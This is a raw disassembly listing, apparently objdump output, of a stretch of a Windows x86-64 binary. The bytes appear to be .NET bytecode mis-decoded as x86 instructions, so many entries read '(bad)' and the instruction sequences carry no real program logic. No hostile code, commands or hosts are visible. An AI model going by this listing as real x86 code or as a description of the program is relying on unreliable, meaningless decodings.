   1400055e4:	40 6a 58             	rex push $0x58
   1400055e7:	0a 06                	or     (%rsi),%al
   1400055e9:	09 33                	or     %esi,(%rbx)
   1400055eb:	dd 02                	fldl   (%rdx)
   1400055ed:	4c 0c 02             	rex.WR or $0x2,%al
   1400055f0:	1f                   	(bad)
   1400055f1:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400055f4:	4c 08 59 1c          	rex.WR or %r11b,0x1c(%rcx)
   1400055f8:	63 1f                	movsxd (%rdi),%ebx
   1400055fa:	40 6a 5a             	rex push $0x5a
   1400055fd:	0b 08                	or     (%rax),%ecx
   1400055ff:	13 05 07 20 00 10    	adc    0x10002007(%rip),%eax        # 0x15000760c
   140005605:	00 00                	add    %al,(%rax)
   140005607:	6a 37                	push   $0x37
   140005609:	09 12                	or     %edx,(%rdx)
   14000560b:	05 12 01 28 0a       	add    $0xa280112,%eax
   140005610:	00 00                	add    %al,(%rax)
   140005612:	06                   	(bad)
   140005613:	11 05 07 28 da 00    	adc    %eax,0xda2807(%rip)        # 0x140da7e20
   140005619:	00 06                	add    %al,(%rsi)
   14000561b:	02 16                	add    (%rsi),%dl
   14000561d:	6a 55                	push   $0x55
   14000561f:	02 1e                	add    (%rsi),%bl
   140005621:	6a 58                	push   $0x58
   140005623:	16                   	(bad)
   140005624:	6a 55                	push   $0x55
   140005626:	02 1f                	add    (%rdi),%bl
   140005628:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000562b:	16                   	(bad)
   14000562c:	6a 55                	push   $0x55
   14000562e:	2a 00                	sub    (%rax),%al
   140005630:	41 1c 00             	rex.B sbb $0x0,%al
   140005633:	00 04 00             	add    %al,(%rax,%rax,1)
   140005636:	00 00                	add    %al,(%rax)
   140005638:	18 00                	sbb    %al,(%rax)
   14000563a:	00 00                	add    %al,(%rax)
   14000563c:	08 00                	or     %al,(%rax)
   14000563e:	00 00                	add    %al,(%rax)
   140005640:	20 00                	and    %al,(%rax)
   140005642:	00 00                	add    %al,(%rax)
   140005644:	0e                   	(bad)
   140005645:	00 00                	add    %al,(%rax)
   140005647:	00 3b                	add    %bh,(%rbx)
   140005649:	00 00                	add    %al,(%rax)
   14000564b:	01 0b                	add    %ecx,(%rbx)
   14000564d:	30 04 00             	xor    %al,(%rax,%rax,1)
   140005650:	41 00 00             	add    %al,(%r8)
   140005653:	00 26                	add    %ah,(%rsi)
   140005655:	00 00                	add    %al,(%rax)
   140005657:	11 02                	adc    %eax,(%rdx)
   140005659:	1e                   	(bad)
   14000565a:	6a 58                	push   $0x58
   14000565c:	4c 13 04 12          	adc    (%rdx,%rdx,1),%r8
   140005660:	05 0d 12 05 03       	add    $0x305120d,%eax
   140005665:	28 2d 00 00 06 0c    	sub    %ch,0xc060000(%rip)        # 0x14c06566b
   14000566b:	04 4a                	add    $0x4a,%al
   14000566d:	0b de                	or     %esi,%ebx
   14000566f:	0d fe 06 2b 00       	or     $0x2b06fe,%eax
   140005674:	00 06                	add    %al,(%rsi)
   140005676:	09 28                	or     %ebp,(%rax)
   140005678:	7d 00                	jge    0x14000567a
   14000567a:	00 06                	add    %al,(%rsi)
   14000567c:	dc 11                	fcoml  (%rcx)
   14000567e:	04 08                	add    $0x8,%al
   140005680:	07                   	(bad)
   140005681:	28 0d 00 00 06 26    	sub    %cl,0x26060000(%rip)        # 0x166065687
   140005687:	02 1e                	add    (%rsi),%bl
   140005689:	6a 58                	push   $0x58
   14000568b:	4c 0a 06             	rex.WR or (%rsi),%r8b
   14000568e:	02 1e                	add    (%rsi),%bl
   140005690:	6a 58                	push   $0x58
   140005692:	06                   	(bad)
   140005693:	1f                   	(bad)
   140005694:	40 6a 58             	rex push $0x58
   140005697:	55                   	push   %rbp
   140005698:	2a 00                	sub    (%rax),%al
   14000569a:	00 00                	add    %al,(%rax)
   14000569c:	41 1c 00             	rex.B sbb $0x0,%al
   14000569f:	00 04 00             	add    %al,(%rax,%rax,1)
   1400056a2:	00 00                	add    %al,(%rax)
   1400056a4:	13 00                	adc    (%rax),%eax
   1400056a6:	00 00                	add    %al,(%rax)
   1400056a8:	05 00 00 00 18       	add    $0x18000000,%eax
   1400056ad:	00 00                	add    %al,(%rax)
   1400056af:	00 0d 00 00 00 3b    	add    %cl,0x3b000000(%rip)        # 0x17b0056b5
   1400056b5:	00 00                	add    %al,(%rax)
   1400056b7:	01 03                	add    %eax,(%rbx)
   1400056b9:	30 04 00             	xor    %al,(%rax,%rax,1)
   1400056bc:	2b 00                	sub    (%rax),%eax
   1400056be:	00 00                	add    %al,(%rax)
   1400056c0:	27                   	(bad)
   1400056c1:	00 00                	add    %al,(%rax)
   1400056c3:	11 04 1f             	adc    %eax,(%rdi,%rbx,1)
   1400056c6:	19 6a 58             	sbb    %ebp,0x58(%rdx)
   1400056c9:	46 2d 22 02 03 04    	rex.RX sub $0x4030222,%eax
   1400056cf:	1f                   	(bad)
   1400056d0:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400056d3:	4c 28 45 00          	rex.WR sub %r8b,0x0(%rbp)
   1400056d7:	00 06                	add    %al,(%rsi)
   1400056d9:	04 0a                	add    $0xa,%al
   1400056db:	04 4c                	add    $0x4c,%al
   1400056dd:	10 02                	adc    %al,(%rdx)
   1400056df:	03 06                	add    (%rsi),%eax
   1400056e1:	28 57 00             	sub    %dl,0x0(%rdi)
   1400056e4:	00 06                	add    %al,(%rsi)
   1400056e6:	04 1f                	add    $0x1f,%al
   1400056e8:	19 6a 58             	sbb    %ebp,0x58(%rdx)
   1400056eb:	46 2c de             	rex.RX sub $0xde,%al
   1400056ee:	2a cc                	sub    %ah,%cl
   1400056f0:	0b 30                	or     (%rax),%esi
   1400056f2:	03 00                	add    (%rax),%eax
   1400056f4:	50                   	push   %rax
   1400056f5:	00 00                	add    %al,(%rax)
   1400056f7:	00 28                	add    %ch,(%rax)
   1400056f9:	00 00                	add    %al,(%rax)
   1400056fb:	11 02                	adc    %eax,(%rdx)
   1400056fd:	0a 12                	or     (%rdx),%dl
   1400056ff:	02 04 55 12 02 1e 58 	add    0x581e0212(,%rdx,2),%al
   140005706:	04 55                	add    $0x55,%al
   140005708:	12 02                	adc    (%rdx),%al
   14000570a:	1f                   	(bad)
   14000570b:	10 58 05             	adc    %bl,0x5(%rax)
   14000570e:	55                   	push   %rbp
   14000570f:	02 03                	add    (%rbx),%al
   140005711:	2e 12 12             	cs adc (%rdx),%dl
   140005714:	02 06                	add    (%rsi),%al
   140005716:	28 6f 00             	sub    %ch,0x0(%rdi)
   140005719:	00 06                	add    %al,(%rsi)
   14000571b:	06                   	(bad)
   14000571c:	1f                   	(bad)
   14000571d:	40 6a 58             	rex push $0x58
   140005720:	0a 06                	or     (%rsi),%al
   140005722:	03 33                	add    (%rbx),%esi
   140005724:	ee                   	out    %al,(%dx)
   140005725:	12 02                	adc    (%rdx),%al
   140005727:	12 02                	adc    (%rdx),%al
   140005729:	1e                   	(bad)
   14000572a:	58                   	pop    %rax
   14000572b:	4c 55                	rex.WR push %rbp
   14000572d:	12 02                	adc    (%rdx),%al
   14000572f:	1e                   	(bad)
   140005730:	58                   	pop    %rax
   140005731:	4c 0b de             	or     %rsi,%r11
   140005734:	0e                   	(bad)
   140005735:	fe 06                	incb   (%rsi)
   140005737:	72 00                	jb     0x140005739
   140005739:	00 06                	add    %al,(%rsi)
   14000573b:	12 02                	adc    (%rdx),%al
   14000573d:	28 7d 00             	sub    %bh,0x0(%rbp)
   140005740:	00 06                	add    %al,(%rsi)
   140005742:	dc 12                	fcoml  (%rdx)
   140005744:	02 28                	add    (%rax),%ch
   140005746:	72 00                	jb     0x140005748
   140005748:	00 06                	add    %al,(%rsi)
   14000574a:	07                   	(bad)
   14000574b:	2a 41 1c             	sub    0x1c(%rcx),%al
   14000574e:	00 00                	add    %al,(%rax)
   140005750:	04 00                	add    $0x0,%al
   140005752:	00 00                	add    %al,(%rax)
   140005754:	13 00                	adc    (%rax),%eax
   140005756:	00 00                	add    %al,(%rax)
   140005758:	26 00 00             	es add %al,(%rax)
   14000575b:	00 39                	add    %bh,(%rcx)
   14000575d:	00 00                	add    %al,(%rax)
   14000575f:	00 0e                	add    %cl,(%rsi)
   140005761:	00 00                	add    %al,(%rax)
   140005763:	00 3b                	add    %bh,(%rbx)
   140005765:	00 00                	add    %al,(%rax)
   140005767:	01 03                	add    %eax,(%rbx)
   140005769:	30 01                	xor    %al,(%rcx)
   14000576b:	00 07                	add    %al,(%rdi)
   14000576d:	00 00                	add    %al,(%rax)
   14000576f:	00 00                	add    %al,(%rax)
   140005771:	00 00                	add    %al,(%rax)
   140005773:	00 02                	add    %al,(%rdx)
   140005775:	28 38                	sub    %bh,(%rax)
   140005777:	00 00                	add    %al,(%rax)
   140005779:	06                   	(bad)
   14000577a:	2a cc                	sub    %ah,%cl
   14000577c:	03 30                	add    (%rax),%esi
   14000577e:	04 00                	add    $0x0,%al
   140005780:	1c 00                	sbb    $0x0,%al
   140005782:	00 00                	add    %al,(%rax)
   140005784:	18 00                	sbb    %al,(%rax)
   140005786:	00 11                	add    %dl,(%rcx)
   140005788:	02 03                	add    (%rbx),%al
   14000578a:	02 4c 1e 6a          	add    0x6a(%rsi,%rbx,1),%cl
   14000578e:	58                   	pop    %rax
   14000578f:	4c 28 45 00          	rex.WR sub %r8b,0x0(%rbp)
   140005793:	00 06                	add    %al,(%rsi)
   140005795:	1f                   	(bad)
   140005796:	58                   	pop    %rax
   140005797:	6a 0a                	push   $0xa
   140005799:	02 4c 1f 58          	add    0x58(%rdi,%rbx,1),%cl
   14000579d:	6a 28                	push   $0x28
   14000579f:	da 00                	fiaddl (%rax)
   1400057a1:	00 06                	add    %al,(%rsi)
   1400057a3:	2a 0b                	sub    (%rbx),%cl
   1400057a5:	30 04 00             	xor    %al,(%rax,%rax,1)
   1400057a8:	0b 01                	or     (%rcx),%eax
   1400057aa:	00 00                	add    %al,(%rax)
   1400057ac:	29 00                	sub    %eax,(%rax)
   1400057ae:	00 11                	add    %dl,(%rcx)
   1400057b0:	02 4c 13 08          	add    0x8(%rbx,%rdx,1),%cl
   1400057b4:	03 11                	add    (%rcx),%edx
   1400057b6:	08 59 1c             	or     %bl,0x1c(%rcx)
   1400057b9:	63 13                	movsxd (%rbx),%edx
   1400057bb:	0c 02                	or     $0x2,%al
   1400057bd:	1e                   	(bad)
   1400057be:	6a 58                	push   $0x58
   1400057c0:	4c 11 08             	adc    %r9,(%rax)
   1400057c3:	59                   	pop    %rcx
   1400057c4:	1c 63                	sbb    $0x63,%al
   1400057c6:	13 07                	adc    (%rdi),%eax
   1400057c8:	11 07                	adc    %eax,(%rdi)
   1400057ca:	02 28                	add    (%rax),%ch
   1400057cc:	65 00 00             	add    %al,%gs:(%rax)
   1400057cf:	06                   	(bad)
   1400057d0:	33 05 28 62 00 00    	xor    0x6228(%rip),%eax        # 0x14000b9fe
   1400057d6:	06                   	(bad)
   1400057d7:	11 07                	adc    %eax,(%rdi)
   1400057d9:	17                   	(bad)
   1400057da:	6a 58                	push   $0x58
   1400057dc:	13 06                	adc    (%rsi),%eax
   1400057de:	02 11                	add    (%rcx),%dl
   1400057e0:	06                   	(bad)
   1400057e1:	28 64 00 00          	sub    %ah,0x0(%rax,%rax,1)
   1400057e5:	06                   	(bad)
   1400057e6:	13 05 02 12 05 28    	adc    0x28051202(%rip),%eax        # 0x1680569ee
   1400057ec:	54                   	push   %rsp
   1400057ed:	00 00                	add    %al,(%rax)
   1400057ef:	06                   	(bad)
   1400057f0:	0a 11                	or     (%rcx),%dl
   1400057f2:	0c 1f                	or     $0x1f,%al
   1400057f4:	40 6a 5a             	rex push $0x5a
   1400057f7:	06                   	(bad)
   1400057f8:	58                   	pop    %rax
   1400057f9:	0b 07                	or     (%rdi),%eax
   1400057fb:	1f                   	(bad)
   1400057fc:	40 6a 58             	rex push $0x58
   1400057ff:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140005802:	04 0d                	add    $0xd,%al
   140005804:	12 0e                	adc    (%rsi),%cl
   140005806:	02 55 12             	add    0x12(%rbp),%dl
   140005809:	0e                   	(bad)
   14000580a:	1e                   	(bad)
   14000580b:	58                   	pop    %rax
   14000580c:	06                   	(bad)
   14000580d:	55                   	push   %rbp
   14000580e:	12 0e                	adc    (%rsi),%cl
   140005810:	1f                   	(bad)
   140005811:	10 58 11             	adc    %bl,0x11(%rax)
   140005814:	05 55 12 0e 1f       	add    $0x1f0e1255,%eax
   140005819:	18 58 09             	sbb    %bl,0x9(%rax)
   14000581c:	55                   	push   %rbp
   14000581d:	12 0e                	adc    (%rsi),%cl
   14000581f:	1f                   	(bad)
   140005820:	20 58 09             	and    %bl,0x9(%rax)
   140005823:	55                   	push   %rbp
   140005824:	12 0d 13 0b 12 0d    	adc    0xd120b13(%rip),%cl        # 0x14d12633d
   14000582a:	04 28                	add    $0x28,%al
   14000582c:	2d 00 00 06 13       	sub    $0x13060000,%eax
   140005831:	0a 05 4a 13 09 de    	or     -0x21f6ecb6(%rip),%al        # 0x11e096b81
   140005837:	0e                   	(bad)
   140005838:	fe 06                	incb   (%rsi)
   14000583a:	2b 00                	sub    (%rax),%eax
   14000583c:	00 06                	add    %al,(%rsi)
   14000583e:	11 0b                	adc    %ecx,(%rbx)
   140005840:	28 7d 00             	sub    %bh,0x0(%rbp)
   140005843:	00 06                	add    %al,(%rsi)
   140005845:	dc 07                	faddl  (%rdi)
   140005847:	11 0a                	adc    %ecx,(%rdx)
   140005849:	11 09                	adc    %ecx,(%rcx)
   14000584b:	28 0d 00 00 06 26    	sub    %cl,0x26060000(%rip)        # 0x166065851
   140005851:	12 0e                	adc    (%rsi),%cl
   140005853:	1f                   	(bad)
   140005854:	18 58 07             	sbb    %bl,0x7(%rax)
   140005857:	55                   	push   %rbp
   140005858:	02 1e                	add    (%rsi),%bl
   14000585a:	6a 58                	push   $0x58
   14000585c:	4c 0c 03             	rex.WR or $0x3,%al
   14000585f:	08 33                	or     %dh,(%rbx)
   140005861:	0d 02 4c 08 06       	or     $0x6084c02,%eax
   140005866:	02 28                	add    (%rax),%ch
   140005868:	55                   	push   %rbp
   140005869:	00 00                	add    %al,(%rax)
   14000586b:	06                   	(bad)
   14000586c:	26 2b 21             	es sub (%rcx),%esp
   14000586f:	02 4c 03 06          	add    0x6(%rbx,%rax,1),%cl
   140005873:	02 28                	add    (%rax),%ch
   140005875:	55                   	push   %rbp
   140005876:	00 00                	add    %al,(%rax)
   140005878:	06                   	(bad)
   140005879:	26 12 0e             	es adc (%rsi),%cl
   14000587c:	1f                   	(bad)
   14000587d:	18 58 06             	sbb    %bl,0x6(%rax)
   140005880:	55                   	push   %rbp
   140005881:	03 02                	add    (%rdx),%eax
   140005883:	1e                   	(bad)
   140005884:	6a 58                	push   $0x58
   140005886:	4c 11 04 02          	adc    %r8,(%rdx,%rax,1)
   14000588a:	28 55 00             	sub    %dl,0x0(%rbp)
   14000588d:	00 06                	add    %al,(%rsi)
   14000588f:	26 12 0e             	es adc (%rsi),%cl
   140005892:	1e                   	(bad)
   140005893:	58                   	pop    %rax
   140005894:	16                   	(bad)
   140005895:	6a 55                	push   $0x55
   140005897:	02 06                	add    (%rsi),%al
   140005899:	11 06                	adc    %eax,(%rsi)
   14000589b:	11 05 28 63 00 00    	adc    %eax,0x6328(%rip)        # 0x14000bbc9
   1400058a1:	06                   	(bad)
   1400058a2:	de 0e                	fimuls (%rsi)
   1400058a4:	fe 06                	incb   (%rsi)
   1400058a6:	61                   	(bad)
   1400058a7:	00 00                	add    %al,(%rax)
   1400058a9:	06                   	(bad)
   1400058aa:	12 0e                	adc    (%rsi),%cl
   1400058ac:	28 7d 00             	sub    %bh,0x0(%rbp)
   1400058af:	00 06                	add    %al,(%rsi)
   1400058b1:	dc 12                	fcoml  (%rdx)
   1400058b3:	0e                   	(bad)
   1400058b4:	28 61 00             	sub    %ah,0x0(%rcx)
   1400058b7:	00 06                	add    %al,(%rsi)
   1400058b9:	07                   	(bad)
   1400058ba:	2a 00                	sub    (%rax),%al
   1400058bc:	41 34 00             	rex.B xor $0x0,%al
   1400058bf:	00 04 00             	add    %al,(%rax,%rax,1)
   1400058c2:	00 00                	add    %al,(%rax)
   1400058c4:	82                   	(bad)
   1400058c5:	00 00                	add    %al,(%rax)
   1400058c7:	00 06                	add    %al,(%rsi)
   1400058c9:	00 00                	add    %al,(%rax)
   1400058cb:	00 88 00 00 00 0e    	add    %cl,0xe000000(%rax)
   1400058d1:	00 00                	add    %al,(%rax)
   1400058d3:	00 3b                	add    %bh,(%rbx)
   1400058d5:	00 00                	add    %al,(%rax)
   1400058d7:	01 04 00             	add    %eax,(%rax,%rax,1)
   1400058da:	00 00                	add    %al,(%rax)
   1400058dc:	74 00                	je     0x1400058de
   1400058de:	00 00                	add    %al,(%rax)
   1400058e0:	80 00 00             	addb   $0x0,(%rax)
   1400058e3:	00 f4                	add    %dh,%ah
   1400058e5:	00 00                	add    %al,(%rax)
   1400058e7:	00 0e                	add    %cl,(%rsi)
   1400058e9:	00 00                	add    %al,(%rax)
   1400058eb:	00 3b                	add    %bh,(%rbx)
   1400058ed:	00 00                	add    %al,(%rax)
   1400058ef:	01 03                	add    %eax,(%rbx)
   1400058f1:	30 02                	xor    %al,(%rdx)
   1400058f3:	00 08                	add    %cl,(%rax)
   1400058f5:	00 00                	add    %al,(%rax)
   1400058f7:	00 00                	add    %al,(%rax)
   1400058f9:	00 00                	add    %al,(%rax)
   1400058fb:	00 02                	add    %al,(%rdx)
   1400058fd:	25 28 33 00 00       	and    $0x3328,%eax
   140005902:	06                   	(bad)
   140005903:	2a 03                	sub    (%rbx),%al
   140005905:	30 04 00             	xor    %al,(%rax,%rax,1)
   140005908:	22 00                	and    (%rax),%al
   14000590a:	00 00                	add    %al,(%rax)
   14000590c:	18 00                	sbb    %al,(%rax)
   14000590e:	00 11                	add    %dl,(%rcx)
   140005910:	02 1e                	add    (%rsi),%bl
   140005912:	6a 58                	push   $0x58
   140005914:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140005917:	02 1f                	add    (%rdi),%bl
   140005919:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000591c:	4c                   	rex.WR
   14000591d:	2e 09 02             	cs or  %eax,(%rdx)
   140005920:	03 04 28             	add    (%rax,%rbp,1),%eax
   140005923:	3e 00 00             	ds add %al,(%rax)
   140005926:	06                   	(bad)
   140005927:	2a 02                	sub    (%rdx),%al
   140005929:	06                   	(bad)
   14000592a:	03 04 28             	add    (%rax,%rbp,1),%eax
   14000592d:	3f                   	(bad)
   14000592e:	00 00                	add    %al,(%rax)
   140005930:	06                   	(bad)
   140005931:	2a cc                	sub    %ah,%cl
   140005933:	cc                   	int3
   140005934:	03 30                	add    (%rax),%esi
   140005936:	04 00                	add    $0x0,%al
   140005938:	22 00                	and    (%rax),%al
   14000593a:	00 00                	add    %al,(%rax)
   14000593c:	18 00                	sbb    %al,(%rax)
   14000593e:	00 11                	add    %dl,(%rcx)
   140005940:	02 1e                	add    (%rsi),%bl
   140005942:	6a 58                	push   $0x58
   140005944:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140005947:	02 1f                	add    (%rdi),%bl
   140005949:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000594c:	4c                   	rex.WR
   14000594d:	2e 09 02             	cs or  %eax,(%rdx)
   140005950:	03 04 28             	add    (%rax,%rbp,1),%eax
   140005953:	40 00 00             	rex add %al,(%rax)
   140005956:	06                   	(bad)
   140005957:	2a 02                	sub    (%rdx),%al
   140005959:	06                   	(bad)
   14000595a:	03 04 28             	add    (%rax,%rbp,1),%eax
   14000595d:	41 00 00             	add    %al,(%r8)
   140005960:	06                   	(bad)
   140005961:	2a cc                	sub    %ah,%cl
   140005963:	cc                   	int3
   140005964:	03 30                	add    (%rax),%esi
   140005966:	04 00                	add    $0x0,%al
   140005968:	22 00                	and    (%rax),%al
   14000596a:	00 00                	add    %al,(%rax)
   14000596c:	18 00                	sbb    %al,(%rax)
   14000596e:	00 11                	add    %dl,(%rcx)
   140005970:	02 1e                	add    (%rsi),%bl
   140005972:	6a 58                	push   $0x58
   140005974:	4c 0a 06             	rex.WR or (%rsi),%r8b
   140005977:	02 1f                	add    (%rdi),%bl
   140005979:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000597c:	4c                   	rex.WR
   14000597d:	2e 09 02             	cs or  %eax,(%rdx)
   140005980:	03 04 28             	add    (%rax,%rbp,1),%eax
   140005983:	42 00 00             	rex.X add %al,(%rax)
   140005986:	06                   	(bad)
   140005987:	2a 02                	sub    (%rdx),%al
   140005989:	06                   	(bad)
   14000598a:	03 04 28             	add    (%rax,%rbp,1),%eax
   14000598d:	43 00 00             	rex.XB add %al,(%r8)
   140005990:	06                   	(bad)
   140005991:	2a cc                	sub    %ah,%cl
   140005993:	cc                   	int3
   140005994:	03 30                	add    (%rax),%esi
   140005996:	02 00                	add    (%rax),%al
   140005998:	0b 00                	or     (%rax),%eax
   14000599a:	00 00                	add    %al,(%rax)
   14000599c:	2a 00                	sub    (%rax),%al
   14000599e:	00 11                	add    %dl,(%rcx)
   1400059a0:	02 12                	add    (%rdx),%dl
   1400059a2:	00 28                	add    %ch,(%rax)
   1400059a4:	39 00                	cmp    %eax,(%rax)
   1400059a6:	00 06                	add    %al,(%rsi)
   1400059a8:	26 02 2a             	es add (%rdx),%ch
   1400059ab:	00 03                	add    %al,(%rbx)
   1400059ad:	30 01                	xor    %al,(%rcx)
   1400059af:	00 07                	add    %al,(%rdi)
   1400059b1:	00 00                	add    %al,(%rax)
   1400059b3:	00 00                	add    %al,(%rax)
   1400059b5:	00 00                	add    %al,(%rax)
   1400059b7:	00 02                	add    %al,(%rdx)
   1400059b9:	28 26                	sub    %ah,(%rsi)
   1400059bb:	00 00                	add    %al,(%rax)
   1400059bd:	06                   	(bad)
   1400059be:	2a 00                	sub    (%rax),%al
   1400059c0:	0b 30                	or     (%rax),%esi
   1400059c2:	03 00                	add    (%rax),%eax
   1400059c4:	83 00 00             	addl   $0x0,(%rax)
   1400059c7:	00 2b                	add    %ch,(%rbx)
   1400059c9:	00 00                	add    %al,(%rax)
   1400059cb:	11 16                	adc    %edx,(%rsi)
   1400059cd:	0a 02                	or     (%rdx),%al
   1400059cf:	28 25 00 00 06 26    	sub    %ah,0x26060000(%rip)        # 0x1660659d5
   1400059d5:	17                   	(bad)
   1400059d6:	0a 7f 1d             	or     0x1d(%rdi),%bh
   1400059d9:	00 00                	add    %al,(%rax)
   1400059db:	04 7f                	add    $0x7f,%al
   1400059dd:	28 00                	sub    %al,(%rax)
   1400059df:	00 04 28             	add    %al,(%rax,%rbp,1)
   1400059e2:	17                   	(bad)
   1400059e3:	00 00                	add    %al,(%rax)
   1400059e5:	06                   	(bad)
   1400059e6:	13 04 02             	adc    (%rdx,%rax,1),%eax
   1400059e9:	7f 1d                	jg     0x140005a08
   1400059eb:	00 00                	add    %al,(%rax)
   1400059ed:	04 12                	add    $0x12,%al
   1400059ef:	04 28                	add    $0x28,%al
   1400059f1:	2f                   	(bad)
   1400059f2:	00 00                	add    %al,(%rax)
   1400059f4:	06                   	(bad)
   1400059f5:	26 7f 2a             	es jg  0x140005a22
   1400059f8:	00 00                	add    %al,(%rax)
   1400059fa:	04 7f                	add    $0x7f,%al
   1400059fc:	29 00                	sub    %eax,(%rax)
   1400059fe:	00 04 28             	add    %al,(%rax,%rbp,1)
   140005a01:	17                   	(bad)
   140005a02:	00 00                	add    %al,(%rax)
   140005a04:	06                   	(bad)
   140005a05:	0d 02 7f 2a 00       	or     $0x2a7f02,%eax
   140005a0a:	00 04 12             	add    %al,(%rdx,%rdx,1)
   140005a0d:	03 28                	add    (%rax),%ebp
   140005a0f:	30 00                	xor    %al,(%rax)
   140005a11:	00 06                	add    %al,(%rsi)
   140005a13:	26 7f 2b             	es jg  0x140005a41
   140005a16:	00 00                	add    %al,(%rax)
   140005a18:	04 7f                	add    $0x7f,%al
   140005a1a:	18 00                	sbb    %al,(%rax)
   140005a1c:	00 04 28             	add    %al,(%rax,%rbp,1)
   140005a1f:	17                   	(bad)
   140005a20:	00 00                	add    %al,(%rax)
   140005a22:	06                   	(bad)
   140005a23:	0c 02                	or     $0x2,%al
   140005a25:	7f 2b                	jg     0x140005a52
   140005a27:	00 00                	add    %al,(%rax)
   140005a29:	04 12                	add    $0x12,%al
   140005a2b:	02 28                	add    (%rax),%ch
   140005a2d:	31 00                	xor    %eax,(%rax)
   140005a2f:	00 06                	add    %al,(%rsi)
   140005a31:	26 02 0b             	es add (%rbx),%cl
   140005a34:	de 17                	ficoms (%rdi)
   140005a36:	06                   	(bad)
   140005a37:	17                   	(bad)
   140005a38:	5f                   	pop    %rdi
   140005a39:	2c 11                	sub    $0x11,%al
   140005a3b:	06                   	(bad)
   140005a3c:	1f                   	(bad)
   140005a3d:	fe                   	(bad)
   140005a3e:	5f                   	pop    %rdi
   140005a3f:	0a fe                	or     %dh,%bh
   140005a41:	06                   	(bad)
   140005a42:	24 00                	and    $0x0,%al
   140005a44:	00 06                	add    %al,(%rsi)
   140005a46:	02 28                	add    (%rax),%ch
   140005a48:	7d 00                	jge    0x140005a4a
   140005a4a:	00 06                	add    %al,(%rsi)
   140005a4c:	dc 07                	faddl  (%rdi)
   140005a4e:	2a 00                	sub    (%rax),%al
   140005a50:	41 1c 00             	rex.B sbb $0x0,%al
   140005a53:	00 04 00             	add    %al,(%rax,%rax,1)
   140005a56:	00 00                	add    %al,(%rax)
   140005a58:	00 00                	add    %al,(%rax)
   140005a5a:	00 00                	add    %al,(%rax)
   140005a5c:	6a 00                	push   $0x0
   140005a5e:	00 00                	add    %al,(%rax)
   140005a60:	6a 00                	push   $0x0
   140005a62:	00 00                	add    %al,(%rax)
   140005a64:	17                   	(bad)
   140005a65:	00 00                	add    %al,(%rax)
   140005a67:	00 3b                	add    %bh,(%rbx)
   140005a69:	00 00                	add    %al,(%rax)
   140005a6b:	01 0b                	add    %ecx,(%rbx)
   140005a6d:	30 04 00             	xor    %al,(%rax,%rax,1)
   140005a70:	d5 00 00 00          	{rex2 0x0} add %al,(%rax)
   140005a74:	2c 00                	sub    $0x0,%al
   140005a76:	00 11                	add    %dl,(%rcx)
   140005a78:	16                   	(bad)
   140005a79:	13 09                	adc    (%rcx),%ecx
   140005a7b:	12 08                	adc    (%rax),%cl
   140005a7d:	28 1a                	sub    %bl,(%rdx)
   140005a7f:	00 00                	add    %al,(%rax)
   140005a81:	06                   	(bad)
   140005a82:	26 12 08             	es adc (%rax),%cl
   140005a85:	28 1b                	sub    %bl,(%rbx)
   140005a87:	00 00                	add    %al,(%rax)
   140005a89:	06                   	(bad)
   140005a8a:	26 28 d1             	es sub %dl,%cl
   140005a8d:	00 00                	add    %al,(%rax)
   140005a8f:	06                   	(bad)
   140005a90:	20 37                	and    %dh,(%rdi)
   140005a92:	13 00                	adc    (%rax),%eax
   140005a94:	00 5a 20             	add    %bl,0x20(%rdx)
   140005a97:	00 30                	add    %dh,(%rax)
   140005a99:	00 00                	add    %al,(%rax)
   140005a9b:	5e                   	pop    %rsi
   140005a9c:	6e                   	outsb  (%rsi),(%dx)
   140005a9d:	21 00                	and    %eax,(%rax)
   140005a9f:	f0 ff                	lock (bad)
   140005aa1:	ff 00                	incl   (%rax)
   140005aa3:	00 00                	add    %al,(%rax)
   140005aa5:	00 5f 13             	add    %bl,0x13(%rdi)
   140005aa8:	06                   	(bad)
   140005aa9:	11 06                	adc    %eax,(%rsi)
   140005aab:	20 00                	and    %al,(%rax)
   140005aad:	10 00                	adc    %al,(%rax)
   140005aaf:	00 6a 58             	add    %ch,0x58(%rdx)
   140005ab2:	13 05 11 05 1f 40    	adc    0x401f0511(%rip),%eax        # 0x1801f5fc9
   140005ab8:	02 03                	add    (%rbx),%al
   140005aba:	28 1e                	sub    %bl,(%rsi)
   140005abc:	00 00                	add    %al,(%rax)
   140005abe:	06                   	(bad)
   140005abf:	0a 06                	or     (%rsi),%al
   140005ac1:	2d 09 16 6a 13       	sub    $0x136a1609,%eax
   140005ac6:	04 dd                	add    $0xdd,%al
   140005ac8:	77 00                	ja     0x140005aca
   140005aca:	00 00                	add    %al,(%rax)
   140005acc:	06                   	(bad)
   140005acd:	80 4e 00 00          	orb    $0x0,0x0(%rsi)
   140005ad1:	04 11                	add    $0x11,%al
   140005ad3:	05 80 45 00 00       	add    $0x4580,%eax
   140005ad8:	04 11                	add    $0x11,%al
   140005ada:	06                   	(bad)
   140005adb:	6d                   	insl   (%dx),(%rdi)
   140005adc:	0d 16 09 16 36       	or     $0x36160916,%eax
   140005ae1:	11 26                	adc    %esp,(%rsi)
   140005ae3:	28 d1                	sub    %dl,%cl
   140005ae5:	00 00                	add    %al,(%rax)
   140005ae7:	06                   	(bad)
   140005ae8:	28 dd                	sub    %bl,%ch
   140005aea:	00 00                	add    %al,(%rax)
   140005aec:	06                   	(bad)
   140005aed:	61                   	(bad)
   140005aee:	09 5e 1f             	or     %ebx,0x1f(%rsi)
   140005af1:	f0 5f                	lock pop %rdi
   140005af3:	6e                   	outsb  (%rsi),(%dx)
   140005af4:	0c 08                	or     $0x8,%al
   140005af6:	06                   	(bad)
   140005af7:	58                   	pop    %rax
   140005af8:	0b 03                	or     (%rbx),%eax
   140005afa:	25 4c 08 58 55       	and    $0x5558084c,%eax
   140005aff:	12 07                	adc    (%rdi),%al
   140005b01:	28 1c 00             	sub    %bl,(%rax,%rax,1)
   140005b04:	00 06                	add    %al,(%rsi)
   140005b06:	26 07                	es (bad)
   140005b08:	12 07                	adc    (%rdi),%al
   140005b0a:	4c 12 07             	rex.WR adc (%rdi),%r8b
   140005b0d:	1e                   	(bad)
   140005b0e:	58                   	pop    %rax
